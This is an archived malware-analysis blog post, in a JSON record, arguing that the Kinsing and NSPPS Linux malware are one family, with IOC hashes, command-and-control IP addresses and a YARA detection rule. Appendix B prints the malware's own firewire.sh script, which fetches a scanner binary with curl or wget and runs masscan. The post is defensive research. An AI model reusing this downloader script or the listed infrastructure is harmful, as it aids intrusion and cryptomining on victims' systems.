{
    "id": "7fc94665-4eb1-465e-a5c9-66697051a314",
    "created_at": "2023-01-12T15:05:12.244806Z",
    "updated_at": "2025-03-27T02:17:01.061762Z",
    "deleted_at": null,
    "sha1_hash": "2c4807a025cf1749c8a1bc7966427ca85a136b82",
    "title": "2021-03-09 - Kinsing- The Malware with Two Faces",
    "authors": "",
    "file_creation_date": "2022-05-28T19:26:17Z",
    "file_modification_date": "2022-05-28T19:26:17Z",
    "file_size": 7767472,
    "plain_text": "# Kinsing: The Malware with Two Faces\n\n**[cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces](https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces)**\n\nMarch 9, 2021\n\nLately, we’ve been busy researching the developing field of cloud and container threats. Why\nfocus here? Because, as this technology becomes more popular and continues to evolve,\nattackers are also evolving their techniques to infiltrate these systems.\n\nDuring our research, we came across Kinsing – an ELF malware that has been involved in\n[multiple attack campaigns, including Redis and](https://blog.trendmicro.com/trendlabs-security-intelligence/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining/) [SaltStack. Kinsing is written in Go language,](https://redcanary.com/blog/kinsing-malware-citrix-saltstack/)\naka Golang, which is a relatively new language that has seen sharply increased popularity\namong malware authors within the past few years.\n\nWhile analyzing a few Kinsing samples, we were surprised to find some artifacts related to\nanother malware family called NSPPS. At first, we came up with several ideas that might\nexplain those findings- maybe the common parts are open source tools that are used by both\nfamilies, or perhaps one group mimics the other. What our research shows is the two families\nare actually the same one, with two different names that were given to it by the security\nresearch community.\n\nIn this blog, we will review the differences and similarities between Kinsing and NSPPS,\npresent our findings and explain how and why we concluded that they are the same malware\nfamily.\n\n## NSPPS vs. Kinsing – The Differences\n\n\n-----\n\nAt the beginning of the research, we collected all of the IOCs that were published by security\nfirms for detecting Kinsing and NSPPS, wrote our own YARA rules and gathered the results.\nAfter a little clean up, we had several dozens of samples that we focused on.\n\nOf the 27 samples of Kinsing and NSPPS, only one of them was published as NSPPS –\n5059d67cd24eb4b0b4a174a072ceac6a47e14c3302da2c6581f81c39d8a076c6. The other 26\nsamples were classified as Kinsing.\n\nWe found some major artifacts differentiating the NSPPS sample from the Kinsing samples.\n\n**_Versions and Dates: Let’s Compare Numbers_**\n\nFirst and most notably, NSPPS sample was written using Golang version 1.9.7:\n\n_Figure N. 1: Golang version for NSPPS_\n\nKinsing samples were written using Golang version 1.13.4 or 1.13.6:\n\n_Figure N. 2: Golang versions for NSPPS_\n\nThis difference might imply that the compilation time of each sample is different, since it is\nreasonable to use the latest version, although not necessary.\n\nDetermining the compilation timestamp of the samples was important to the process of\ndifferentiating the two families. Unfortunately, unlike Windows PE files, Linux ELF files do not\nhave a compilation timestamp by design, leaving us with another missing piece of\ninformation. Luckily, Golang malware (or generally speaking – Golang binaries) by default\nuses Github packages, which usually contain a version number. This helps to determine a\nminimum date for the malware compilation by calculating the last release date of the newest\npackage it uses.\n\nBelow is a partial list of the common packages for Kinsing samples with their release dates:\n\n**Package** **Version** **Release Date**\n\n\n-----\n\n|Package|Version|Release Date|\n|---|---|---|\n|go-resty/resty|2.1.0|10/10/2019|\n|google/btree|1.0.0|13/08/2018|\n|kelseyhightower/envconfig|1.4.0|24/05/2019|\n|markbates/pkger|0.12.8|21/11/2019|\n|paulbellamy/ratecounter|0.2.0|19/07/2017|\n|peterbourgon/diskv|2.0.1|14/08/2017|\n|shirou/gopsutil|2.19.10|19/10/2019|\n\n\n_Table N. 1: a partial list of Kinsing packages with their release dates_\n\n[“pkger ” has the latest release date:](https://github.com/markbates/pkger)\n\n_Figure N. 3: latest package release for Kinsing_\n\nTherefore, we can conclude that all 26 Kinsing samples were compiled after Nov. 21, 2019.\n\nBelow is a partial list of the packages NSPPS uses:\n\n**Package** **Version** **Release Date**\n\ngoogle/btree 1.0.0 13/08/2018\n\ngo-resty/resty 2.1.0 10/10/2019\n\nkelseyhightower/envconfig 1.4.0 25/05/2019\n\npaulbellamy/ratecounter 0.2.0 19/07/2017\n\npeterbourgon/diskv 3.0.0 25/04/2019\n\n|Package|Version|Release Date|\n|---|---|---|\n|google/btree|1.0.0|13/08/2018|\n|go-resty/resty|2.1.0|10/10/2019|\n|kelseyhightower/envconfig|1.4.0|25/05/2019|\n|paulbellamy/ratecounter|0.2.0|19/07/2017|\n\n\n-----\n\n_Table N. 2: a partial list of NSPPS packages with their release dates_\n\nAs shown, the earliest possible compilation date for NSPPS is Oct. 10, 2019. This suggests\nit was compiled before Kinsing, but that may not necessarily be the case.\n\n**_To Be or Not to Be: That’s the Difference_**\n\nAn odd artifact found in Kinsing samples is the presence of the full text of William\nShakespeare’s play Hamlet, as seen below:\n\n_Figure N. 4: Hamlet play inside Kinsing_\n\nThis evidence was previously published by several researchers. The common assumption is\nthat this was done [to avoid detection by static detection engines or](https://www.lacework.com/blog/h2miner-botnet/) to increase the binary\nsize, which serves the same goal. This artifact is not present in NSPPS samples.\n\nAt first, it seems like an important difference – maybe the authors of Kinsing paid more\nattention to hiding their malware than the authors of NSPPS. However, after digging a little\ndeeper, we found another explanation. When checking the location of the Hamlet play inside\nKinsing, it has some references to it, rather than just existing in the data section among other\nstrings of the binary:\n\n\n-----\n\n_Figure N. 5: Hamlet play X-refs_\n\nThen, looking at the relevant function:\n\n_Figure N. 6: code X-references to the Hamlet play_\n\nThis function’s name is\ngithub.com.markbates.pkger.internal.takeon.github.com.markbates.hepa.filters, which\nmeans: “a function located in filters file in hepa package written by markbates and uploaded\nto Github, but actually embedded into pkger package written by markbates and uploaded to\nGithub as well.”\n\nAnd as expected:\n\n\n-----\n\n_Figure N. 7: pkger package that contains the Hamlet play_\n\nWhich leads to the next piece of code:\n\n\n-----\n\n_Figure N. 8: Hamlet play inside of pkger package_\n\n[(And of course, don’t forget to check release 0.12.8, as this piece was removed since then](https://github.com/markbates/pkger/tree/v0.12.8)\nby the author.)\n\nWhen analyzing the hepa package, we understood the purpose of Hamlet- it is used to hide\nsecret parts of a buffer. For example, let’s say you want to upload your useful AWS script to\nGitHub for sharing your wisdom with the world, but then you’re not sure if you removed all of\nthe parts containing your secret AWS keys. In this situation, you may use a tool that\nautomatically searches for password-related information and removes it. Think about how\nawesome it would be to replace your token with a powerful phrase from Hamlet!\n\nNow, as you’ve probably noticed, the pkger package wasn’t listed as one of NSPPS’\npackages, so the absence of Hamlet from NSPPS is only related to the absence of this\npackage that is used as part of cryptomining activity (more on this later).\n\nThe bottom line is, although Hamlet is considered to be (or not to be?) a great and\nmeaningful play, it’s not meaningful evidence in our comparison. Rather, it’s a side effect of\nother more significant elements.\n\n**_Where’s the money?_**\n\nWhen reading reports about Kinsing samples, it is clear that the purpose of Kinsing is to\ninstall a cryptoMiner named kdevtmpfsi, as shown in this diagram from Aqua Security:\n\n\n-----\n\n_Figure N. 9: Kinsing diagram as posted by Aqua Security_\nSource: [https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)\n\nWhen looking at the code of Kinsing samples, we find many functions related to the\ncryptominer activity:\n\n_Figure N. 10: Kinsing functions related to Miner activity_\n\nThose functions are called from main.main, which is the real main function of the code.\n\nAll of the code related to cryptomining activity, including checks and actions, is missing from\nthe NSPPS sample. This is a major difference between the two tools: the cryptomining\nfunctionality suggests that the purpose of the Kinsing malware is to install a cryptominer in\nthe victim system, while the purpose of the NSPPS malware is to provide RAT functionality.\n\n## NSPPS vs. Kinsing – The Similarities\n\nWhile we found several differences between Kinsing and NSPPS that make them look like\ncompletely different malware families, a tiny voice reminds us that we promised to prove they\nare from the same family. Below are some of those similarities.\n\n**_Masscan for All_**\n\n[One characteristic that repeats itself through all of the samples is the usage of the Masscan](https://github.com/robertdavidgraham/masscan)\ntool – more specifically, the same exact usage of Masscan. Both Kinsing and NSPPS\nmalware contain an embedded, clear-text bash script named firewire.sh that is executed by\nthe function main.masscan. This function writes the script to the disk, changes its mode to\nexecutable and then runs it.\n\nSee the full firewire.sh script in Appendix B.\n\n\n-----\n\nThe code in main.masscan that handles that is as follows:\n\n_Figure N. 11: Kinsing’s code for handling firewire.sh_\n\nThe main.masscan function for NSPPS is a little different (probably due to compiler\ndifference as mentioned above) but contains the same WriteFile -> runcmd -> newobject\nsequence as seen in Kinsing:\n\n_Figure N. 12: NSPPS’s code for handling firewire.sh_\n\nFrom our research, the firewire.sh script isn’t publicly available for use, nor has it been\npresented as an Open Source tool, so we believe that this piece of evidence isn’t just a\ncoincidence. This means that there was a connection between the authors of the two\nmalwares, or at least that they shared their resources.\n\n**_Code Structure_**\n\nWhen analyzing NSPPS, it is notable that it features a very simple code structure. At the\nbeginning of the code, NSPPS calls three initialization functions, then it enters a while loop\nthat runs forever. The loop gets a task (getTask()) from the C2 server and executes it\n(doTask()). Inside the doTask function, the malware checks the string it got, then chooses the\nright function for performing the received task.\n\nTo our surprise, when analyzing Kinsing, we found it has the same structure, except for a few\nminor changes. The main change is an additional initialization function that’s responsible for\ncryptomining. There are also some minor changes to the inner functions inside the loop.\n\nSee the code snippets below for a demonstration:\n\n\n-----\n\n_Figure N. 13: Pseudo-Code for NSPPS’s and Kinsing’s code structure comparison_\n\n\n-----\n\nThere are also differences between the different samples of Kinsing. For example, not all of\nthem have the “redis_brute” functionality, and some have much fewer functions.\n\nLooking at the common structure we just described, we believe that the relation between the\ntwo families now hardly seems like a coincidence or random imitation, but more like\ncooperation between the authors – or even reuse of the same code.\n\n**_Encryption, Encryption, Encryption_**\n\nIn their [analysis for the NSPPS sample, IronNet included a YARA rule that searches for an](https://www.ironnet.com/blog/malware-analysis-nspps-a-go-rat-backdoor)\nRC4 key used by NSPPS. Using this YARA and searching for this specific RC4 key, we\nfound all of the Kinsing samples in it, as well as the NSPPS sample:\n\n_Figure N. 14: Kinsing RC4 key_\n\n_Figure N. 15: NSPPS RC4 key_\n\nWhen checking the XRefs to this key to find the usage of it, we can see that it is used\nthrough almost the same functions in both malware families.\n\nUsage for NSPPS:\n\n_Figure N. 16: RC4 key usage for NSPPS_\n\nUsage for Kinsing:\n\n\n-----\n\n_Figure N. 17: RC4 key usage for Kinsing_\n\nThe only difference is the function getMinerPid that exists only in the Kinsing samples, since\nNSPPS doesn’t have the same cryptomining functionality.\n\nLooking at the function main.RC4 that implements the RC4 encryption in both malwares, we\nsee that the two implementations are practically identical. See the comparison below:\n\n\n-----\n\n_Figure N. 18: NSPPS’s and Kinsing’s main.RC4 function comparison_\n\n**_Functions Names_**\n\nAfter all of this, the last thing to show is the function list of those samples.\n\n\n-----\n\nGolang binaries have the property of preserving the source code symbols, which comes in\nhandy in our case by making the entire list of original function names available. We already\ndiscussed the packages used in the binaries, which contain their own functions, so now we\nare interested in the functions that were written by the malware author. Those functions are\nidentified by the prefix main., and they are the ones used in the next comparison.\n\nNSPPS has 63 functions.\n\nKinsing samples vary from each other a bit. Let’s compare a random Kinsing sample that\nwas published earlier:\nb70d14a7c069c2a88a8a55a6a2088aea184f84c0e110678e6a4afa2eb377649f. This sample\nonly has 59 functions (see Appendix C for a complete list of functions for both samples).\n\nBoth samples have 51 function names in common, which represent 83% of the functions.\nKinsing has eight unique function names and NSPPS has 12. Kinsing’s unique functions are\ncryptomining-related while NSPPS’ unique functions are mostly RAT-related. From that, we\nlearn that a major part of the code is named the same, which implies that the same author\nwrote both samples or that one of the authors copied from the other.\n\n## Conclusion\n\nWe’ve presented both NSPPS and Kinsing and discussed their differences: Golang versions,\npackages, the Hamlet play script and cryptomining activity. We also presented the similarities\nof the two families: the Masscan script named Firewire.sh, the shared code structure, the\nRC4 key and the function names.\n\nAll of the above suggests that both malwares represent the same family. We believe the first\nversion was compiled sometime before Nov. 2019, was named NSPPS and was used as a\nRAT. Later, the malware was updated with some new packages (such as markbates\\pkger),\nnew functionalities (cryptomining capabilities), new Shakespeare inspiration and was named\nas Kinsing by other security companies.\n\nAlthough the usage and the purpose of the malware changed, we as researchers can still\nbenefit from the similarities between the malware because analysis and detection can be\nmuch easier and quicker using the knowledge we already have from former versions.\n\n**_A Note About Detection via VirusTotal_**\n\nWhen signing some of Kinsing artifacts and searching for new samples, we found a few\ndozen files that clearly contain a part of Kinsing’s code, but are damaged as executables and\ncannot be run as proper ELF. Further examination helped us realize that those files are only\na part of another sample, meaning someone cut the sample and uploaded it to VirusTotal.\nFor example, the sample\nd247687e9bdb8c4189ac54d10efd29aee12ca2af78b94a693113f382619a175b is a known\nKinsing sample that is 16.87 MB long, and the file\n\n\n-----\n\na51a4398dd7f11e34ea4d896cde4e7b0537351f82c580f5ec951a8e7ea017865 that was\nuploaded to VirusTotal on June 19, 2020, was detected as Kinsing by some AV vendors, but\nis actually only the first 4.84 MB of the last sample.\n\nThese partial samples could be an attacker trying to test different parts of the malware\nagainst AV engines, or a security researcher examining sections of the code. So, to detect\nonly proper ELFs, a condition should be added to match only files in which the sum of their\nsections header sizes matches the size of the entire file (check out the YARA rule down\nbelow).\n\n**Appendix A: IOCs & YARA**\n\n**IOCs:**\n\n|Indicator|Type|\n|---|---|\n|0b0aa978c061628ec7cd611edeec3373d4742cbda533b07a2b3eb84a9dd2cb8a|Sha256|\n|0c811140be9f59d69da925a4e15eb630352fa8ad4f931730aec9ae80a624d584|Sha256|\n|2132d7bed60fda38adda28efdbbd2df2c9379fed5de2e68fc6801f5621b596b0|Sha256|\n|4b0138c12e3209d8f9250c591fcc825ee6bff5f57f87ed9c661df6d14500e993|Sha256|\n|4f4e69abb2e155a712df9b3d0387f9fb2d6db8f3a2c88d7bbe199251ec08683f|Sha256|\n|5059d67cd24eb4b0b4a174a072ceac6a47e14c3302da2c6581f81c39d8a076c6|Sha256|\n|511de8dd7f3cb4c5d88cd5a62150e6826cb2f825fa60607a201a8542524442e2|Sha256|\n|554c233d0e034b8bb3560b010f99f70598f0e419e77b9ce39d5df0dd3bc25728|Sha256|\n|655ee9ddd6956af8c040f3dce6b6c845680a621e463450b22d31c3a0907727e4|Sha256|\n|6814d22be80e1475e47e8103b11a0ec0daa3a9fdd5caa3a0558d13dc16c143d9|Sha256|\n|681f88d79c3ecab8683b39f8107b29258deb2d58fcea7b0c008bab76e18aa607|Sha256|\n|6e8c96f9e9a886fd6c51cce7f6c50d1368ca5b48a398cc1fedc63c1de1576c1e|Sha256|\n|7727a0b47b7fd56275fa3c1c4468db7fa201c788d1e56597c87deaff45aad634|Sha256|\n|7f9f8209dc619d686b32d408fed0beb3a802aa600ddceb5c8d2a9555cdb3b5e0|Sha256|\n|8c9b621ba8911350253efc15ab3c761b06f70f503096279f2a173c006a393ee1|Sha256|\n|98d3fd460e56eff5182d5abe2f1cd7f042ea24105d0e25ea5ec78fedc25bac7c|Sha256|\n|9fbb49edad10ad9d096b548e801c39c47b74190e8745f680d3e3bcd9b456aafc|Sha256|\n\n\n-----\n\n|Indicator|Type|\n|---|---|\n|a0363f3caad5feb8fc5c43e589117b8053cbf5bc82fc0034346ea3e3984e37e8|Sha256|\n|a5b010a5dd29d2f68ac9d5463eb8a29195f40f5103e1cc3353be2e9da6859dc6|Sha256|\n|b44dae9d1ce0ebec7a40e9aa49ac01e2c775fa9e354477a45b723c090b5a28f2|Sha256|\n|b70d14a7c069c2a88a8a55a6a2088aea184f84c0e110678e6a4afa2eb377649f|Sha256|\n|c44b63b1b53cbd9852c71de84ce8ad75f623935f235484547e9d94a7bdf8aa76|Sha256|\n|c9932ca45e952668238960dbba7f01ce699357bedc594495c0ace512706dd0ac|Sha256|\n|ccfda7239b2ac474e42ad324519f805171e7c69d37ad29265c0a8ba54096033d|Sha256|\n|d247687e9bdb8c4189ac54d10efd29aee12ca2af78b94a693113f382619a175b|Sha256|\n|db3b9622c81528ef2e7dbefb4e8e9c8c046b21ce2b021324739a195c966ae0b7|Sha256|\n|f2e7244e2a7d6b28b1040259855aeac956e56228c41808bccb8e37d87c164570|Sha256|\n|104.248.3.165|C2|\n|139.99.50.255|C2|\n|185.61.7.8|C2|\n|188.120.254.224|C2|\n|193.33.87.220|C2|\n|195.123.220.193|C2|\n|45.10.88.102|C2|\n|46.229.215.164|C2|\n|46.243.253.167|C2|\n|47.65.90.240|C2|\n|62.113.112.127|C2|\n|67.205.161.58|C2|\n|91.215.169.111|C2|\n\n\n**YARA:**\n\n\n-----\n\n```\nimport elf \nrule Kinsing_Malware\n{\n     meta:\n          author = \"Aluma Lavi, CyberArk\"\n          date = \"22-01-2021\"\n          version = \"1.0\"\n          hash =\n\"d247687e9bdb8c4189ac54d10efd29aee12ca2af78b94a693113f382619a175b\"\n          description = \"Kinsing/NSPPS malware\"\n     strings:\n          $rc4_key = { 37 36 34 31 35 33 34 34 36 62 36 31 }\n          $firewire = \"./firewire -iL $INPUT --rate $RATE -p$PORT -oL $OUTPUT\"\n          $packa1 = \"google/btree\" ascii wide\n          $packa2 = \"kardianos/osext\" ascii wide\n          $packa3 = \"kelseyhightower/envconfig\" ascii wide\n          $packa4 = \"markbates/pkger\" ascii wide\n          $packa5 = \"nu7hatch/gouuid\" ascii wide\n          $packa6 = \"paulbellamy/ratecounter\" ascii wide\n          $packa7 = \"peterbourgon/diskv\" ascii wide\n          $func1 = \"main.RC4\" ascii wide\n          $func2 = \"main.runTaskWithScan\" ascii wide\n          $func3 = \"main.backconnect\" ascii wide\n          $func4 = \"main.downloadAndExecute\" ascii wide\n          $func5 = \"main.startCmd\" ascii wide\n          $func6 = \"main.execTaskOut\" ascii wide\n          $func7 = \"main.minerRunningCheck\" ascii wide\n     condition:\n          (uint16(0) == 0x457F\n          and not (elf.sections[0].size + elf.sections[1].size +\nelf.sections[2].size + elf.sections[3].size + elf.sections[4].size +\nelf.sections[5].size + elf.sections[6].size + elf.sections[7].size > filesize))\n          and ($rc4_key\n          or $firewire\n          or all of ($packa*)\n          or 4 of ($func*)\n          )\n}\n\n```\n**Appendix B: Firewire.sh Script**\n\n\n-----\n\n```\n#!/bin/sh\n          PORT=$1\n          RATE=$2\n          INPUT=$3\n          OUTPUT=$4\n          MASSCAN=$5\n          cat /etc/os-release | grep -vw grep | grep \"rhel\" >/dev/null\n          if [ $? -eq 0 ]\n          then\n          rpm -qa | grep libpcap-dev > /dev/null\n          if [[ $? -eq 0 ]]; then\n          echo \"Package is installed rhel!\"\n          else\n          echo \"Package is NOT installed rhel!\"\n          yum -y update \n          yum -y install libpcap-devel\n          fi\n          else\n          if [ $(dpkg-query -W -f='${Status}' libpcap-dev 2>/dev/null | grep -c\n\"ok installed\") -eq 0 ];\n          then\n          echo \"Package is NOT installed deb!\"\n          apt-get update\n          apt-get install -y libpcap-dev\n          else\n          echo \"Package is installed deb!\"\n          fi\n          fi\n          if [ -x \"$(command -v md5sum)\" ]; then\n          sum=$(md5sum firewire | awk '{ print $1 }')\n          echo $sum\n          case $sum in\n          45a7ef83238f5244738bb5e7e3dd6299)\n          echo \"firewire OK\"\n          ;;\n          *)\n          echo \"firewire wrong\"\n          (curl -o firewire $MASSCAN || wget -O firewire $MASSCAN)\n          ;;\n          esac\n          else\n          echo \"No md5sum\"\n          (curl -o firewire $MASSCAN || wget -O firewire $MASSCAN)\n          fi\n          chmod +x firewire\n          ./firewire -iL $INPUT --rate $RATE -p$PORT -oL $OUTPUT 2>/dev/null\n          if [ $? -eq 0 ]\n          then\n          echo \"success\"\n          else\n          echo \"fail\"\n\n```\n\n-----\n\n```\n          sudo ./firewire iL $INPUT rate $RATE p$PORT oL $OUTPUT\n2>/dev/null\n          if [ $? -eq 0 ]\n          then\n          echo \"success2\"\n          else\n          echo \"fail2\"\n          fi\n          fi\n\n```\n**Appendix C: NSPPS & Kinsing Function list**\n\n|NSPPS|Kinsing|\n|---|---|\n|DownloadFile|DownloadFile|\n|ExecOutput|ExecOutput|\n|Hosts|Hosts|\n||Pid|\n|RC4|RC4|\n|RandStringRunes|RandStringRunes|\n|Result|Result|\n|SetSocks|SetSocks|\n|Specification|Specification|\n|TargetsWrapper|TargetsWrapper|\n|Task|Task|\n|TaskPair|TaskPair|\n|addResult|addResult|\n|backconnect||\n|checkHealth|checkHealth|\n|connectForSocks|connectForSocks|\n|contains|contains|\n||copyFileContents|\n|doRequestWithTooManyOpenFiles||\n\n\n-----\n\n|NSPPS|Kinsing|\n|---|---|\n|doTask|doTask|\n|downloadAndExecute||\n|encStruct|encStruct|\n|execTask|execTask|\n|execTaskOut|execTaskOut|\n|getActiveC2CUrl||\n||getMinerPid|\n|getOrCreateListForTaskResult|getOrCreateListForTaskResult|\n|getOrCreateRateCounterForTask|getOrCreateRateCounterForTask|\n|getOrCreateUuid|getOrCreateUuid|\n|getTargets|getTargets|\n|getTask|getTask|\n|getWriteableDir|getWriteableDir|\n|go|go|\n|hash_file_md5|hash_file_md5|\n|healthChecker|healthChecker|\n|inc|inc|\n|init|init|\n||isMinerRunning|\n|main|main|\n|makeClient||\n|masscan|masscan|\n||minRun|\n||minerRunningCheck|\n|move|move|\n\n\n-----\n\n|NSPPS|Kinsing|\n|---|---|\n|randIntRange|randIntRange|\n|redisBrute||\n|request||\n|resultSender|resultSender|\n|runTask|runTask|\n|runTaskWithHttp||\n|runTaskWithScan||\n|runcmd|runcmd|\n||sendMinerPid|\n|sendResult|sendResult|\n|sendSocks|sendSocks|\n|setActiveC2CUrl|setActiveC2CUrl|\n|setExecOutput|setExecOutput|\n|setLog|setLog|\n|setUuid|setUuid|\n|socks|socks|\n|startCmd|startCmd|\n||startCmdWithOutputSingle|\n|startSocks|startSocks|\n|syncCmd|syncCmd|\n|taskScan|taskScan|\n|taskWithHttpWorker||\n|taskWithScanWorker||\n|taskWorker|taskWorker|\n|tcpTask||\n\n\n-----\n\n|NSPPS|Kinsing|\n|---|---|\n|updateTask|updateTask|\n|writable|writable|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-09 - Kinsing- The Malware with Two Faces.pdf"
    ],
    "report_names": [
        "2021-03-09 - Kinsing- The Malware with Two Faces.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535912,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653765977,
    "ts_modification_date": 1653765977,
    "files": {
        "pdf": "https://archive.orkl.eu/2c4807a025cf1749c8a1bc7966427ca85a136b82.pdf",
        "text": "https://archive.orkl.eu/2c4807a025cf1749c8a1bc7966427ca85a136b82.txt",
        "img": "https://archive.orkl.eu/2c4807a025cf1749c8a1bc7966427ca85a136b82.jpg"
    }
}